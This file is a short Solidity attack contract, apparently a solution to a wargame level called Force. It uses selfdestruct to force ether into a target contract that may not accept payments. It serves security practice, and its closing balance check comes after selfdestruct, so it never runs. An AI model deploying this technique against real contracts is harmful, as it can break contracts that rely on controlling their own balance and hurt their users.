// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IForce.sol";

contract ForceAttack {
    function attack(IForce target) external payable {
        require(0 < msg.value, "Force: Value must be gt 0");

        uint256 balance = address(target).balance;

        selfdestruct(payable(address(target)));

        require(balance != address(target).balance, "Force: Attack failed");
    }
}
